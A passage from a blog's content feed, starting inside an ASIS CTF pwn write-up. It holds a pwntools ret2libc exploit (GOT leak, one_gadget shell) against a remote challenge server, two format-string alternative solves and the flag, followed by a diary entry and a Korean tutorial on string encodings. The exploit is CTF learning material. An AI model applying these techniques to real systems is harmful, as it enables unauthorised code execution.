process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;65.21.255.31&#x27;</span>, <span class="number">13370</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./../lib/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401433</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">72</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(e.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(e.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libc_base = leak - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">72</span></span><br><span class="line">payload += p64(libc_base + <span class="number">0xe3b01</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Another-Solve"><a href="#Another-Solve" class="headerlink" title="Another Solve"></a>Another Solve</h2><h3 id="1-Using-FSB"><a href="#1-Using-FSB" class="headerlink" title="1. Using FSB"></a>1. Using FSB</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="string">b&#x27;1$999&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf@plt (</span><br><span class="line">   $rdi = 0x007ffe3b4d0ac8 ‚Üí 0x73393939243125 (&quot;%1$999s&quot;?),</span><br><span class="line">   $rsi = 0x007ffe3b4d0ab0 ‚Üí 0x0000000000000005,</span><br><span class="line">   $rdx = 0x007ffe3b4d0ab0 ‚Üí 0x0000000000000005</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>Maybe.. I think this solution is intention.</p><h3 id="2-Using-rsi-x3D-x3D-rdx"><a href="#2-Using-rsi-x3D-x3D-rdx" class="headerlink" title="2. Using rsi &#x3D;&#x3D; rdx"></a>2. Using rsi &#x3D;&#x3D; rdx</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="string">b&#x27;1s%&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> </span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">72</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(e.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(e.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, payload)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf@plt (</span><br><span class="line">   $rdi = 0x007ffe99d75878 ‚Üí 0x00007325733125 (&quot;%1s%s&quot;?),</span><br><span class="line">   $rsi = 0x007ffe99d75860 ‚Üí 0x0000000000000005,</span><br><span class="line">   $rdx = 0x007ffe99d75860 ‚Üí 0x0000000000000005</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ASIS&#123;06e5ff13b438f5d6626a97758fddde3e502fe3fc&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> ASIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> one_gadget </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-10-14 Diary</title>
      <link href="/221014-diary/"/>
      <url>/221014-diary/</url>
      
        <content type="html"><![CDATA[<h2 id="Î∏îÎ°úÍ∑∏-Í¥ÄÎ†®"><a href="#Î∏îÎ°úÍ∑∏-Í¥ÄÎ†®" class="headerlink" title="Î∏îÎ°úÍ∑∏ Í¥ÄÎ†®"></a>Î∏îÎ°úÍ∑∏ Í¥ÄÎ†®</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><p>ÎåìÍ∏Ä Í∏∞Îä•ÏùÑ Ï∂îÍ∞ÄÌñàÎã§. </p><p>Ï†ÑÏóê Ïû†Íπê Ïö¥ÏòÅÌñàÎçò Î∏îÎ°úÍ∑∏Îäî utterancesÏùÑ ÏÇ¨Ïö©ÌñàÏóàÎã§. GithubÏùò issueÎ°ú ÎåìÍ∏ÄÏùÑ Í¥ÄÎ¶¨Ìï† Ïàò ÏûàÎã§Îäî Ï†êÏù¥ Îß§Î†•Ï†ÅÏù¥ÏóàÏßÄÎßå Github Í≥ÑÏ†ïÏù¥ ÏûàÏñ¥ÏïºÎßå ÎåìÍ∏ÄÏùÑ Îì±Î°ùÌï† Ïàò ÏûàÎã§Îäî Ï†êÏù¥ ÎßàÏùåÏóê Îì§ÏßÄ ÏïäÏïòÎã§. Í∑∏ÎûòÎèÑ ÎßàÌÅ¨Îã§Ïö¥ÎèÑ ÏßÄÏõêÌïòÍ≥† ÎÇòÎ¶Ñ uiÎèÑ ÏòàÎªêÏÑú Í≥ÑÏÜç ÏÇ¨Ïö©ÌïòÍ≥† Ïã∂ÏóàÏúºÎÇò ÎÇ¥Í∞Ä ÏõêÌïòÎäî Í∏∞Îä•Ïù¥ Íµ¨ÌòÑÎêòÏñ¥ ÏûàÏßÄ ÏïäÏïòÎã§. Î∞îÎ°ú reaction Í∏∞Îä•Ïù∏Îç∞, tistoryÏóê ÌïòÌä∏Î°ú Í≥µÍ∞ê ÎàÑÎ•¥Îäî.. Í∑∏Îü∞ Í∏∞Îä•ÏùÑ ÏõêÌñàÏßÄÎßå utterancesÏóêÎäî Í∑∏Îü∞ Í∏∞Îä•Ïù¥ ÏóÜÏóàÎã§. hexo pluginÏùÑ Ï∞æÏïÑÎ¥§ÏßÄÎßå Ï∞æÏïÑÎ≥¥Í∏∞Í∞Ä ÌûòÎì§ÏóàÎã§. Í∑∏Îü¨Îã§Í∞Ä giscusÎùºÎäî Í≤ÉÏùÑ Î∞úÍ≤¨ÌñàÎã§.</p><p>giscusÎäî utterancesÏôÄ Îß§Ïö∞ Ïú†ÏÇ¨ÌïòÎã§. utterancesÏóêÏÑú ÎåÄÎåìÍ∏Ä Í∏∞Îä•ÏùÑ Ï∂îÍ∞ÄÌñàÎã§. ÎòêÌïú ÎÇ¥Í∞Ä ÏõêÌïòÎäî reaction Í∏∞Îä•Ïù¥ ÏûàÏóàÎã§! Í∑∏ÎûòÏÑú Î∞îÎ°ú giscusÎ•º Ï†ÅÏö©ÌïòÎ†§Í≥† ÌñàÏúºÎÇò ÏùµÎ™ÖÏù∏ ÏÉÅÌÉúÏóêÏÑ† ÎåìÍ∏ÄÍ≥º reactionÏùÑ Ìï† Ïàò ÏóÜÎã§Îäî Í≤ÉÏù¥ ÏùÄÍ∑º Í±∞Ïä¨Î†∏Îã§. </p><p>Í∑∏ÎûòÏÑú Í≤∞Íµ≠ disqusÎ•º Ïù¥Ïö©ÌïòÍ∏∞Î°ú ÌñàÎã§. Í¥ëÍ≥†Í∞Ä Î∂ôÎäîÎã§Îäî ÏÇ¨Ïã§ÎïåÎ¨∏Ïóê ÏÇ¨Ïö©ÌïòÍ∏∞ Í∫ºÎ†§Ï°åÏóàÎäîÎç∞, Ïû†Íπê ÏÑúÏπòÌï¥Î≥∏ Í≤∞Í≥º Í¥ëÍ≥†Îäî ÏùºÏùº Ï°∞ÌöåÏàòÏóê ÏòÅÌñ•ÏùÑ Î∞õÎäî Í≤É Í∞ôÏïòÎã§. Ï†ïÌôïÌïú ÏàòÏπòÎäî Í∏∞ÏñµÏù¥ ÎÇòÏßÄ ÏïäÏßÄÎßå Ïù¥Ï†ïÎèÑÎ©¥ Í¥ëÍ≥† Î∂ôÏùÑ Í±±Ï†ïÏùÑ ÌïòÏßÄ ÏïäÏïÑÎèÑ Îê† Í≤É Í∞ôÎã§Í≥† ÌåêÎã®ÌñàÎã§. „Öã„Öã </p><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p>Search ÌÉ≠ÏùÑ Ï∂îÍ∞ÄÌñàÎã§. Ï†ïÏ†ÅÏúºÎ°ú ÌÉêÏÉâÌï¥ÏÑú ÏÜçÎèÑÍ∞Ä Ïß±Ïß± Îπ†Î•¥Îã§. Îß§Ïö∞ ÎßàÏùåÏóê Îì†Îã§. ÎÇ¥Í∞Ä ÏûêÏ£º Ïì∏ Í≤É Í∞ôÎã§.</p><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><p>Sitemap Îì±Î°ùÏùÑ ÌñàÎã§. Ï†ÑÏóê Ïû†Íπê Ïö¥ÏòÅÌñàÎçò Î∏îÎ°úÍ∑∏ÏóêÎèÑ Sitemap Îì±Î°ùÏùÑ ÌñàÏóàÎäîÎç∞ Í∑∏ ÌùîÏ†ÅÏù¥ ÏïÑÏßÅ ÎÇ®ÏïÑÏûàÎã§ T.T ÏÇ≠Ï†úÌïòÍ≥† Ïû¨Îì±Î°ùÏùÑ ÌñàÏùåÏóêÎèÑ.. ÌùëÌùë<br>ÏÉâÏù∏Ïù¥ Ï†úÎåÄÎ°ú ÏÉùÏÑ±ÎêòÏßÄ ÏïäÏïÑ Ïú†Ìö®ÏÑ± Í≤ÄÏÇ¨Î•º ÏöîÏ≤≠ÌñàÎã§. Ïò§Îûò Í±∏Î¶¥ ÏàòÎèÑ ÏûàÎã§Í≥† ÌïúÎã§. </p>]]></content>
      
      
      <categories>
          
          <category> Diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>How to Deal With Strings in Python</title>
      <link href="/221013-python3-String/"/>
      <url>/221013-python3-String/</url>
      
        <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>PythonÏóêÏÑúÏÑúÏùò Î¨∏ÏûêÏó¥ Ïù∏ÏΩîÎî© Î∞©ÏãùÏùÑ ÏÑ§Î™ÖÌïòÍ∏∞ ÏúÑÌï¥ <code>ASCII</code>ÏôÄ <code>Unicode</code>Ïóê ÎåÄÌï¥ Í∞ÑÎã®Ìûà ÏÑ§Î™ÖÌïúÎã§. Python2ÏóêÏÑúÎäî ÎîîÌè¥Ìä∏ Ïù∏ÏΩîÎî© Î∞©ÏãùÏù¥ <code>ASCII</code>Ïù¥ÏßÄÎßå Python3ÏóêÏÑúÎäî <code>UTF-8</code>ÏùÑ Ï±ÑÌÉùÌñàÎã§. <code>UTF-8</code>ÏùÄ <code>Unicode</code> Ïù∏ÏΩîÎî© Î∞©Ïãù Ï§ë ÌïòÎÇòÎ°ú Ï†ÑÏÑ∏Í≥ÑÏóêÏÑú ÎÑêÎ¶¨ Ïì∞Ïù¥Îäî Ïù∏ÏΩîÎî© Î∞©ÏãùÏù¥Îã§.</p><p>Python2ÏôÄ Python3ÏóêÏÑú Î¨∏ÏûêÏó¥ÏùÑ Îã§Î£®Îäî Î∞©ÏãùÏù¥ Î∞îÎÄåÏóàÏúºÎØÄÎ°ú, payloadÎ•º ÏûëÏÑ±Ìï† Îïå Python2Ïóê ÏùµÏàôÌïú playerÍ∞Ä Python3Î•º ÏÇ¨Ïö©ÌïòÍ∏∞ ÏúÑÌï¥ÏÑúÎäî UnicodeÎ°ú Ïù∏ÏΩîÎî©Ìïú byte Î¨∏ÏûêÏó¥Í≥º ÏùºÎ∞ò Î¨∏ÏûêÏó¥Ïùò Ï∞®Ïù¥Î•º ÏïåÍ≥† ÏûàÏñ¥Ïïº ÌïúÎã§.</p><h2 id="ASCIIÏôÄ-Unicode"><a href="#ASCIIÏôÄ-Unicode" class="headerlink" title="ASCIIÏôÄ Unicode"></a>ASCIIÏôÄ Unicode</h2><p><code>ASCII</code>ÏôÄ <code>Unicode</code>Ïóê ÎåÄÌï¥ Í∞ÑÎã®Ìûà ÏïåÏïÑÎ≥¥Ïûê.</p><h3 id="ÏïÑÏä§ÌÇ§-ASCII-American-Standard-Code-for-Information-Interchange"><a href="#ÏïÑÏä§ÌÇ§-ASCII-American-Standard-Code-for-Information-Interchange" class="headerlink" title="ÏïÑÏä§ÌÇ§ (ASCII, American Standard Code for Information Interchange)"></a>ÏïÑÏä§ÌÇ§ (ASCII, American Standard Code for Information Interchange)</h3><ul><li>1960ÎÖÑÎåÄ ÎØ∏Íµ≠ÏóêÏÑú Ï†ïÏùòÌïú ÌëúÏ§ÄÌôîÌïú Î∂ÄÌò∏Ï≤¥Í≥Ñ</li></ul><p><code>ASCII ÏΩîÎìú</code>Îäî 7bit Ï¶â, 128(&#x3D;2^7)Í∞úÏùò Í≥†Ïú†Ìïú Í∞íÎßå ÏÇ¨Ïö©ÌïúÎã§. Ïª¥Ìì®ÌÑ∞Ïùò Í∏∞Î≥∏ Ï†ÄÏû• Îã®ÏúÑÎäî 1byte(&#x3D;8bits)Ïù∏Îç∞, <code>ASCII ÏΩîÎìú</code>Îäî 7bitÎßå ÏÇ¨Ïö©ÌïúÎã§. ÎÇòÎ®∏ÏßÄ 1bitÎäî Parity BitÏù∏Îç∞, Ïù¥Îäî ÌÜµÏã† ÏóêÎü¨ Í≤ÄÏ∂úÏùÑ ÏùòÎØ∏ÌïúÎã§.</p><p>10ÏßÑÏàòÎ°ú 0Î∂ÄÌÑ∞ 127, 16ÏßÑÏàòÎ°ú 0x00Î∂ÄÌÑ∞ 0x7FÏùò Î≤îÏúÑÎ°ú Î¨∏ÏûêÏó¥ Char Ï¶â, Í≥†Ïú†Í∞íÏùÑ ÌëúÌòÑÌï† Ïàò ÏûàÎã§.</p><p>7bitÎ°ú ÌëúÌòÑÌï† Ïàò ÏûàÎäî <code>ASCII ÏΩîÎìú</code>Îäî ‚ÄòÏòÅÎ¨∏‚ÄôÎßåÏùÑ ÌëúÌòÑÌï† Ïàò ÏûàÎã§. Îã§Î•∏ Ïñ∏Ïñ¥Î•º ÌëúÌòÑÌïòÍ∏∞ÏóêÎäî 7bitÎ°úÎäî Ïó≠Î∂ÄÏ°±Ïù¥ÏóàÎã§. Í∑∏ÎûòÏÑú 8bitsÎ°ú ÌôïÏû•Ìïú ÏïÑÏä§ÌÇ§ ÏΩîÎìúÍ∞Ä Îì±Ïû•ÌñàÎäîÎç∞, Ïù¥Î•º <code>ANSI ÏΩîÎìú</code>ÎùºÍ≥† Î∂ÄÎ•¥Í∏∞Î°ú ÌñàÎã§ÎçîÎùº.</p><p><code>ANSI ÏΩîÎìú</code>Îäî 8bitsÎ°ú ÌëúÌòÑÌï† Ïàò ÏûàÏúºÎãà 256(&#x3D;2^8)Í∞úÏùò Í∞íÏùÑ Ïì∏ Ïàò ÏûàÎäîÎç∞, Ïó¨Ï†ÑÌûà ‚ÄòÌïúÍ∏Ä‚ÄôÏùÑ Ìè¨Ìï®Ìïú ÎπÑÏú†ÎüΩ Íµ≠Í∞ÄÏùò Î¨∏ÏûêÎ•º ÌëúÌòÑÌïòÍ∏∞ÏóêÎäî Ïó≠Î∂ÄÏ°±Ïù¥ÏóàÎã§. Í∑∏ÎûòÏÑú <code>Ïú†ÎãàÏΩîÎìú (Unicode)</code>ÎùºÎäî Ï†Ñ ÏÑ∏Í≥Ñ Ïñ∏Ïñ¥Ïùò Î¨∏ÏûêÎ•º Ï†ïÏùòÌïòÍ∏∞ ÏúÑÌïú Íµ≠Ï†ú ÌëúÏ§Ä ÏΩîÎìúÍ∞Ä Îì±Ïû•ÌñàÎã§.</p><h3 id="Ïú†ÎãàÏΩîÎìú-Unicode"><a href="#Ïú†ÎãàÏΩîÎìú-Unicode" class="headerlink" title="Ïú†ÎãàÏΩîÎìú (Unicode)"></a>Ïú†ÎãàÏΩîÎìú (Unicode)</h3><p><code>Ïú†ÎãàÏΩîÎìú</code>Îäî <code>ASCII ÏΩîÎìú</code>ÎÇò <code>ANSI ÏΩîÎìú</code>Î≥¥Îã§ Ìõ®Ïî¨ ÌÅ¨Í≤å Ïö©ÎüâÏùÑ 2byte(&#x3D;2^16, 65536)Î°ú ÌôïÏû•Ìïú ÏΩîÎìúÏù¥Îã§. Î¨¥Î†§ 65536(&#x3D;2^16)Í∞úÎÇò Î¨∏ÏûêÎ•º Ï†ÄÏû•Ìï† Ïàò ÏûàÏóàÎã§. Ï∞∏Í≥†Î°ú <code>Ïú†ÎãàÏΩîÎìú 3.0Î≤ÑÏ†Ñ</code>ÍπåÏßÄÎäî Ïù¥Î•º <code>Í∏∞Î≥∏ Ïñ∏Ïñ¥Ìåê (BMP, Basic Multilingual Plane)</code>Ïù¥ÎùºÍ≥† Î∂àÎ†ÄÎã§. ÎπÑÌä∏ÎßµÏù¥ ÏïÑÎãàÎã§.</p><p>0x0000Î∂ÄÌÑ∞ 0xFFFFÍπåÏßÄ ÌëúÌòÑÏù¥ Í∞ÄÎä•ÌïòÎã§.</p><p>ÌïòÏßÄÎßå Ïù¥Îäî Îòê ÏÑ∏ÏÉÅÏùò Î™®Îì† Ïñ∏Ïñ¥Î•º Í∞êÎãπÌïòÍ∏∞Í∞Ä ÌûòÎì§ÏóàÎã§. Í∑∏ÎûòÏÑú <code>Ïú†ÎãàÏΩîÎìú 3.0Î≤ÑÏ†Ñ</code>Î∂ÄÌÑ∞ <code>Î≥¥Ï∂© Ïñ∏Ïñ¥Ìåê (Supplementary Plane)</code>ÏùÑ Ï†ïÏùòÌñàÎã§. Ïù¥Îïå ÌïúÏûêÍ∞Ä Í∞ÄÏû• ÎßéÏù¥ Ìï†ÎãπÎ∞õÏïòÎã§Í≥† ÌïúÎã§. Í∑∏Îü∞Îç∞ Ïù¥Í≤ÉÏùÄ bitÎ°ú Ïñ¥ÎñªÍ≤å ÌëúÌòÑÌï† Ïàò ÏûàÏùÑÍπå?</p><p>ÏÇ¨Ïã§ <code>Í∏∞Î≥∏ Ïñ∏Ïñ¥Ìåê</code>ÏóêÎäî ÎåÄÌñâÏΩîÎìú ÏòÅÏó≠Ïù¥ÎûÄ Í≤ÉÏù¥ Ï°¥Ïû¨ÌïúÎã§. ÏÉÅÏúÑ ÎåÄÌñâÏΩîÎìúÏôÄ ÌïòÏúÑ ÎåÄÌñâÏΩîÎìúÎ•º Ï°∞Ìï©Ìï¥ÏÑú <code>Î≥¥Ï∂© Ïñ∏Ïñ¥Ìåê</code>Ïùò Î¨∏ÏûêÎ•º ÌëúÌòÑÌïúÎã§. Ï¶â, 2byteÍ∞Ä Íº≠ Ìïú Í∞úÏùò Î¨∏ÏûêÎ•º ÏùòÎØ∏ÌïòÎäî Í≤ÉÏùÄ ÏïÑÎãàÎã§. ÌïúÍ∞úÎ•º ÏùΩÏñ¥Î≥¥Í≥† ÎåÄÌñâÏΩîÎìúÏù¥Î©¥ Í∑∏ Îã§Ïùå ÌïúÍ∞úÎ•º Îçî ÏùΩÏñ¥ Ìïú Î¨∏ÏûêÎ•º ÏôÑÏÑ±ÌïúÎã§. </p><p><code>Í∏∞Î≥∏ Ïñ∏Ïñ¥Ìåê</code>Ïùò ÎåÄÌñâÏΩîÎìú ÏòÅÏó≠ÏùÄ ÏïÑÎûòÏôÄ Í∞ôÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ÏÉÅÏúÑ ÎåÄÌñâÏΩîÎìú (High Surrogates) : D800 - DBFF</span><br><span class="line">ÌïòÏúÑ ÎåÄÌñâÏΩîÎìú (Low Surrogates) : DC00 - DFFF</span><br></pre></td></tr></table></figure><p>Ï†ïÎ¶¨ÌïòÏûêÎ©¥ <code>Ïú†ÎãàÏΩîÎìúÎäî 2byteÎ°úÎßå ÌëúÌòÑÌï† Ïàò ÏûàÎã§.</code>Îäî ÏôÑÏ†ÑÌûà ÌãÄÎ¶∞ ÏÜåÎ¶¨Ïù¥Îã§. Í≤∞Íµ≠ <code>Ïú†ÎãàÏΩîÎìú</code>Îäî Î™®Îì† Î¨∏ÏûêÏóê index(Unidocde code point, Í≥†Ïú†Ìïú Í∞í)Î•º Î∂ÄÏó¨Ìïú Í≤ÉÏù¥Îã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;A&#x27;ÎùºÎäî Í∏ÄÏûêÎäî 0x0041(U+0041)Ïù¥ÎùºÎäî indexÎ•º Í∞ÄÏßÑÎã§.</span><br><span class="line">&#x27;a&#x27;ÎùºÎäî Í∏ÄÏûêÎäî 0x0061(U+0061)Ïù¥ÎùºÎäî indexÎ•º Í∞ÄÏßÑÎã§.</span><br><span class="line">&#x27;Í∞Ä&#x27;ÎùºÎäî Í∏ÄÏûêÎäî 0xAC00(U+AC00)Ïù¥ÎùºÎäî indexÎ•º Í∞ÄÏßÑÎã§.</span><br></pre></td></tr></table></figure><p>Ï∞∏Í≥†Î°ú <code>U+</code>ÎùºÎäî Ï†ëÎëêÏñ¥Í∞Ä Î∂ôÏñ¥ÏûàÏúºÎ©¥ <code>Ïú†ÎãàÏΩîÎìú</code>ÎùºÎäî ÏùòÎØ∏Ïù¥Îã§. <code>U+0000 ~ U+007F</code>Î°ú <code>ASCII</code> Î¨∏ÏûêÎ•º Î™®Îëê ÌëúÌòÑÌï† Ïàò ÏûàÎã§. Ï∞∏Í≥†Î°ú <code>U+AC00 ~ U+D7AF</code>Î°ú ÌïúÍ∏Ä ÏùåÏ†àÏùÑ ÌëúÌòÑÌï† Ïàò ÏûàÎã§.</p><h2 id="Ïú†ÎãàÏΩîÎìúÎ•º-ÌëúÌòÑÌïòÎäî-Î∞©Î≤ï"><a href="#Ïú†ÎãàÏΩîÎìúÎ•º-ÌëúÌòÑÌïòÎäî-Î∞©Î≤ï" class="headerlink" title="Ïú†ÎãàÏΩîÎìúÎ•º ÌëúÌòÑÌïòÎäî Î∞©Î≤ï"></a>Ïú†ÎãàÏΩîÎìúÎ•º ÌëúÌòÑÌïòÎäî Î∞©Î≤ï</h2><p><code>Ïú†ÎãàÏΩîÎìú</code>Ïùò indexÎ•º ÌëúÌòÑÌïòÎäî Î∞©Î≤ïÏóê ÎåÄÌï¥ ÏïåÏïÑÎ≥¥Ïûê. Ïù¥Îü¨Ìïú indexÎäî Ïó¨Îü¨ ÌòïÏãùÏúºÎ°ú Î≥ÄÌôòÎê† Ïàò ÏûàÎäîÎç∞, Í∑∏ Ï§ë Í∞úÏù∏Ï†ÅÏúºÎ°ú Í∞ÄÏû• ÏùµÏàôÌïú <code>UTF-8</code> Ïù∏ÏΩîÎî©ÏùÑ ÏïåÏïÑÎ¥§Îã§. </p><p>Í∑∏ Ï†ÑÏóê Í∂ÅÍ∏àÏ¶ùÏù¥ ÏûàÎã§. indexÎ•º Î∞îÎ°ú Ïª¥Ìì®ÌÑ∞Ïóê Ï†ÄÏû•ÌïòÎ©¥ ÏïàÎêòÎäî Í±∏Íπå? Ïôú Ïª¥Ìì®ÌÑ∞Ïóê Ï†ÄÏû•ÌïòÍ∏∞ ÏúÑÌï¥ÏÑú Îòê Î≥ÄÌôòÏùÑ Ìï¥ÏïºÌï†Íπå? Ïö©ÎüâÎïåÎ¨∏Ïù¥Îã§. ÏòàÎ•º Îì§Ïñ¥, 1byteÎ°ú Ï∂©Î∂ÑÌûà ÌëúÌòÑÌï† Ïàò ÏûàÎäî AÎ•º Íµ≥Ïù¥ 2byteÎ°ú Ï†ÄÏû•ÌïúÎã§Î©¥ Ïö©Îüâ Î¨∏Ï†úÍ∞Ä ÏÉùÍ∏∏ Í≤ÉÏù¥Îã§. Ìò∏ÌôòÏù¥ ÏûòÎêòÍ≥† Ïö©ÎüâÏùÑ Ï†ÅÍ≤å ÎßåÎì§Í∏∞ ÏúÑÌï¥ Ïú†ÎãàÏΩîÎìúÏùò index(Ïà´Ïûê)Î•º Ïª¥Ìì®ÌÑ∞Ïóê Ìö®Í≥ºÏ†ÅÏúºÎ°ú Ìï†ÎãπÌï¥ÏÑú 0Í≥º 1Î°ú ÌëúÌòÑÌï† ÏßÄ Í≤∞Ï†ïÌïòÎäî <code>Ïù∏ÏΩîÎî© Î∞©Ïãù</code>Ïù¥ ÌïÑÏöîÌïòÎã§. </p><h3 id="UTF-8-Í∞ÄÎ≥ÄÍ∏∏Ïù¥-Ïù∏ÏΩîÎî©-Unicode-Transformation-Format"><a href="#UTF-8-Í∞ÄÎ≥ÄÍ∏∏Ïù¥-Ïù∏ÏΩîÎî©-Unicode-Transformation-Format" class="headerlink" title="UTF-8 (Í∞ÄÎ≥ÄÍ∏∏Ïù¥ Ïù∏ÏΩîÎî©, Unicode Transformation Format)"></a>UTF-8 (Í∞ÄÎ≥ÄÍ∏∏Ïù¥ Ïù∏ÏΩîÎî©, Unicode Transformation Format)</h3><p><code>Ïú†ÎãàÏΩîÎìú</code>Í∞Ä Ïù∏ÌÑ∞ÌéòÏù¥Ïä§ÎùºÎ©¥ <code>UTF-8</code>ÏùÄ Íµ¨ÌòÑÏ≤¥ÎùºÍ≥† Ìï† Ïàò ÏûàÎã§. <code>UTF-8</code>ÏùÄ 8bit Î¨∏Ïûê Ïù∏ÏΩîÎî© ÌòïÏãùÏúºÎ°ú <code>Ïú†ÎãàÏΩîÎìú</code> Î¨∏ÏûêÎ•º indexÏóê Îî∞Îùº 8bit(&#x3D;1byte) ~ 4byteÎ°ú Î≥ÄÌôòÌïúÎã§. </p><p><code>UTF-8</code>ÏùÄ Í∞ÄÎ≥ÄÎ∞îÏù¥Ìä∏Î•º ÏÇ¨Ïö©ÌïòÍ∏∞ ÎïåÎ¨∏Ïóê, 1byteÎ°ú ÌëúÌòÑÏù¥ Ï∂©Î∂ÑÌïú AÎäî 0x41Î°ú ÌëúÌòÑÌïúÎã§. Ïù¥Îäî <code>UTF-8</code>Í≥º <code>ASCII ÏΩîÎìú</code>ÏôÄ ÏòÅÎ¨∏ ÏòÅÏó≠ÏóêÏÑúÎäî 100% Ìò∏ÌôòÎêúÎã§Îäî Í≤ÉÏùÑ ÏùòÎØ∏ÌïúÎã§. </p><h4 id="Code-point-‚Üî-UTF-8-conversion"><a href="#Code-point-‚Üî-UTF-8-conversion" class="headerlink" title="Code point ‚Üî UTF-8 conversion"></a>Code point ‚Üî UTF-8 conversion</h4><table><thead><tr><th align="right">First code point</th><th align="right">Last code point</th><th>Byte 1</th><th>Byte 2</th><th>Byte 3</th><th>Byte 4</th></tr></thead><tbody><tr><td align="right">U+0000</td><td align="right">U+007F</td><td>0xxxxxxx</td><td></td><td></td><td></td></tr><tr><td align="right">U+0080</td><td align="right">U+07FF</td><td>110xxxxx</td><td>10xxxxxx</td><td></td><td></td></tr><tr><td align="right">U+0800</td><td align="right">U+FFFF</td><td>1110xxxx</td><td>10xxxxxx</td><td>10xxxxxx</td><td></td></tr><tr><td align="right">U+10000</td><td align="right">U+10FFFF</td><td>11110xxx</td><td>10xxxxxx</td><td>10xxxxxx</td><td>10xxxxxx</td></tr></tbody></table><p>Ï∂úÏ≤ò: <a href="https://en.wikipedia.org/wiki/UTF-8">https://en.wikipedia.org/wiki/UTF-8</a></p><p>ÏúÑÏôÄ Í∞ôÏù¥ <code>Ïú†ÎãàÏΩîÎìú</code> Î≤îÏúÑÏóê Îî∞Îùº <code>UTF-8</code> Ïù∏ÏΩîÎî©Ïùò byte Í∞úÏàòÍ∞Ä Ï†ïÌï¥ÏßÑÎã§. Ï∞∏Í≥†Î°ú ÌïúÍ∏ÄÏùÄ 3byteÎ°ú ÌëúÌòÑÎêúÎã§.</p><h2 